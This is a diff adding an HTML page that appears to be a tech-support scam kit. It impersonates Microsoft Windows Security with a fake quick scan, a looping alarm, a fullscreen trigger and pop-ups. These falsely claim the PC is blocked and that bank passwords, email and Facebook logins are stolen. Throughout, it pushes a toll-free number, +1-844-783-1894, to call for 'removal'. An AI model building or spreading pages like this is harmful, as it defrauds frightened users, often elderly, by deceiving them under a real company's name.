@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <!-- Required meta tags -->
+      <meta charset="utf-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no; max-scale=1.0">
+      <title>Microsoft Final Warning </title>
+      <link rel="icon" type="image/png" href="assets/microsoft.png">
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+      <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+      <link rel="stylesheet" type="text/css" href="assets/style.css">
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script>
+      
+   </head>
+   <body id="mycanvas" onclick="playSound()"  style="background: url('assets/bg.png');background-size: cover;background-repeat: no-repeat;">
+      <a  onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+         <div class="black" style="height: 145%;"></div>
+      </a>
+      <div class="box" id="box">
+         <div class="top">
+            <p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Microsoft Windows Security<img src="assets/minimize.jpeg" class="" style="float: right; width:115px;"></p>
+         </div>
+         <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1">Security at a glance</h4>
+         <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Check what happens to the safety and health of the device and take all necessary measures.</p>
+         <div class="centerright">
+            <ul>
+               <li>
+                  <br>
+                  <img src="assets/kxFy-clip.png" width="50px;">
+                  <p>Protection against viruses and threats</p>
+                  <p style="top: 103px; position: absolute; font-size: 13px; color: grey;">Measures are necessary. Run a scan to check for threats<br>.</p>
+               </li>
+               <li>
+                  <br><br>
+                  <img src="assets/qsbs-firewall.png" width="60px;">
+                  <p>Firewall and Network Protection</p>
+                  <p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action is required.</p>
+               </li>
+            </ul>
+            <ul>
+               <li>
+                  <br>
+                  <img src="assets/s-S4-acc.png" width="60px;">
+                  <p>Account protection</p>
+                  <p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action is required.</p>
+               </li>
+               <li>
+                  <br>
+                  <img src="assets/Z5BR-network.png" width="51px;"/>
+                  <p>Application and Browser Control</p>
+                  <p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action is required.</p>
+               </li>
+            </ul>
+         </div>
+         <img src="assets/uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+         <br>
+      </div>
+      <!--Windows Security Quick Scan-->
+      <div class="scan" id="scan">
+         <div class="top">
+            <p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Windows Security<img src="assets/minimize.jpeg" class="" style="float: right; width:115px;"></p>
+         </div>
+         <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="assets/okPE-vs.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">Protection against viruses and threats</h4>
+         <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Protect your device from threats.</p>
+         <h3 style="    position: absolute;
+            right: 150px;
+            top: 6px;
+            font-weight: 500;
+            font-size: 19px;" id="text12"><b>+1-844-783-1894 (Free Security)</b></h3>
+         <div class="centerright">
+            <ul>
+               <li>
+                  <div class="flex">
+                     <img src="assets/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;">
+                     <p style="font-weight: 400; position: absolute; left: 30px;">Current threats</p>
+                  </div>
+                  <br><br>
+                  <div class="progress" id="bar">
+                     <div class="progress__bar"></div>
+                  </div>
+                  <p style="font-size: 13px;" id="info">
+                     A quick analysis is underway...<br>Estimated remaining time: 
+                     <n id="time">0</b></n>
+                     <br>
+                     <n id="amount">0</b></n>
+                     Scanned files.
+                  </p>
+                  <a href="#"class="button" id="re">I'm going to cancel it.</a>
+                  <p style=" font-size: 13px;" id="recx">Continue working while you analyze <br>the device.</p>
+                  <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">History of protection</p>
+                  <br>
+                  <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">Scan options <br> Allowed threats <br> Protection history</p>
+               </li>
+               <li>
+                  <div class="flex">
+                     <img src="assets/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: -34px;">
+                     <p style="position: absolute; left: 35px;    bottom: 113px;    line-height: 18px;">Configuring Virus and Threat Prevention <br></p>
+                  </div>
+                  <p style="color: grey; font-size: 13px;">No action is required</p>
+                  <p style="font-size: 13px; color: #0063c6;">Manage settings</p>
+               </li>
+            </ul>
+            <ul>
+               <li>
+                  <p style="position: absolute; top: -55px;">Do you have a question?</p>
+                  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer;">Getting help</p>
+               </li>
+               <li>
+                  <p style="position: absolute; top: 25px;">who will protect me?</p>
+                  <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer;">Supplier Management</p>
+               </li>
+               <li>
+                  <p style="position: absolute; top: 75px; "><br>Windows Help us improve the security of your system</p>
+                  <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">Please send us your comments</p>
+               </li>
+               <li>
+                  <p style="position: absolute; top: 190px;">Change your privacy settings</p>
+                  <p style="position: absolute; top: 220px; font-size: 13px;">
+                     View and edit Windows privacy settings<br>
+                     <n id="which"></b></n>
+                     Terminal.
+                  </p>
+                  <p style="font-size: 13px; color: #0063c6; position: absolute; top: 290px; cursor: pointer;">Privacy settings <br>Privacy dashboard <br>Privacy Statement</p>
+               </li>
+            </ul>
+         </div>
+         <img src="assets/uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+         <br>
+      </div>
+     
+      <div class="alert_popup cardcontainer lightbox">
+         <div class="container">
+            <div class="row">
+               <div class="col-md-12">
+                  <p class="text-center" style="    font-size: 16px;
+                     font-weight: normal;
+                     margin: 0;
+                     margin-bottom: 5px;
+                     padding: 5px 10px;
+                     color: #fff;font-weight: bold;
+                     margin-top: 8px; text-align: center;">Windows Security Spyware Warning</p>
+                  <p class="text-center">** Access to this PC is blocked for security reasons **</p>
+                  <p> Warns you that your computer is infected with a spy Trojan. The following data has been compromised: <br> <br>
+                     > Email ID <br> > Bank password<br>
+                     > Facebook Login<br>
+                     > Photos and photographic documents 
+                  </p>
+                  <!-- <p>The Windows Security scan detected unwanted and potentially unwanted adware on this device that could steal passwords, online credentials, financial information, personal files, images or documents. <br / ><br / ></p> -->
+                  <p> Please contact us immediately so that our engineer can explain the removal process to you by phone.<br><br>to learn more
+                     Contact Windows Support immediately to report this threat, prevent identity theft, and unlock access to this device.<br><br>to learn more
+                     If you close this window, your personal information will be compromised and Windows registration will be interrupted.
+                  </p>
+                  <p style="padding-bottom: 0px;">Windows Phone Support <strong>+1-844-783-1894 (Security Toll-Free)</strong></p>
+                  <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">OK Understood</a> <a class="" id="leave_page">To Cancel</a> </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <audio id="beep" loop>
+         <source src="assets/_Fm7-alert.mp3" type="audio/mpeg">
+      </audio>
+      
+      <div id="lst" class="lst lightbox">
+         <div class="ilb top">
+            <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+               <span id="txtadd" class="fl title"><span class="fl ilb"><img src="assets/def.png" class="logo3"></span> Windows Security Defender Center</span>
+               <span id="txts1" class="fl title2"><a href="#"><img src="assets/cross.png"></a></span>
+            </div>
+         </div>
+         <div id="txtintro">
+            <span class="colo-rd">Statistics: Ads.path of the bride(2).dll<br>
+            Detected threats: Spyware Trojans</span>
+         </div>
+         <img id="banner" src="assets/virus-images.jpeg">
+         <div id="disclaimer">
+            Access to this PC is blocked for security reasons.<br>
+            <span class="support">Contact Windows Support:+1-844-783-1894 (Toll-Free)</span>
+         </div>
+         <div id="bottom">
+            <img id="badge" src="assets/microsoft.png"><span class="title3">Microsoft</span>
+            <ul>
+               <li>
+                  <a href="#">
+                     <div class="fr button2">
+                        <span id="addtochromebutton">Deny</span>
+                     </div>
+                  </a>
+               </li>
+               <li>
+                  <a href="#">
+                     <div class="fr buttons blink">
+                        <span id="addtochromebutton">Allow</span>
+                     </div>
+                  </a>
+               </li>
+            </ul>
+         </div>
+      </div>
+      </div>
+      <div id="footer" style="bottom: 0; position: absolute; cursor: none;width: auto;overflow: hidden;">
+         <div class="row">
+            <div class="col-md-12">
+               <div class="right-foot" style="text-align: center;">
+                  <span id="footertxt"><img src="assets/microsoft.png"> Microsoft: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">Support Contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-844-783-1894 (Toll-Free)</span></span>
+               </div>
+            </div>
+            <div class="col-md-12">
+               <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 12px;">Windows
+                  Defender SmartScreen prevented unrecognized applications from being displayed. When you run this application, your PC can be placed
+                  He's in danger. The analysis of Windows Defender has discovered an unwanted adware that can fly on this device
+                  Password, online login, financial information, personal files, photos or
+                  Document.</small>
+               </marquee>
+            </div>
+         </div>
+      </div>
+      <div id="welcomeDiv"
+         style=" display:none; background-color:#000; height: auto; width: 550px; margin-left:32%;position: absolute;z-index: 9999999999;text-align: center;
+         margin-top: -8px; "
+         class="answer_list">
+         <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not restart or use
+            Your computer.<br>The computer is disabled. Please, call me.<br> Access is a blocking security reason for this
+            Computer.<br> Please contact us immediately. Our technicians will help you solve the problem.
+         </p>
+      </div>
+      <div class="modal fade" id="exitModal" tabindex="-1" role="dialog">
+         <div class="modal-dialog modal-full-height modal-right" role="document">
+            <div class="modal-content">
+               <img id="modal-exit" src="assets/cross.png" class="modal-exit">
+               <div class="modal-body">
+                  <div class="row">
+                     <div class="d-none d-md-block col-md-5 text-center">
+                        <a href="#" target="_blank" class="exit-href" rel="noopener noreferrer nofollow">
+                        <img class="img-fluid rounded" src="assets/stop.png" />
+                        </a>
+                     </div>
+                     <div class="col-12 col-md-7 text-left">
+                        <div id="modal-title" class="modal-title text-center modal-title-1">Microsoft Final Security Warning !!  <br/>
+                           Please do not close this page <br/> Call Now +1-844-783-1894 
+                        </div>
+                        <div class="">
+                           <a class="btn btn-visit btn-popup jumpy" target="_blank" href="#" rel="noopener noreferrer nofollow">
+                           <span>Click here</span>
+                           </a>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="chat-box">
+         <img src="assets/microsoft.png"><span style="color: #222;
+            font-size: 21px;
+            font-weight: 700;
+            margin-left: 9px;
+            position: relative;
+            top: 4px;">Microsoft</span> 
+         <p style="font-weight: 700;">Microsoft Support</p>
+         <h4 style="font-weight: 700;">+1-844-783-1894 <br>(USA Head Office)</h4>
+         <div class="arrow-down">
+            <i class="fa fa-caret-down"></i>
+         </div>
+      </div>
+   </body>
+   <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-EJJQCX60VX"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-EJJQCX60VX');
+</script>
+<script type="text/javascript" src="assets/script.js"></script>
+</html>
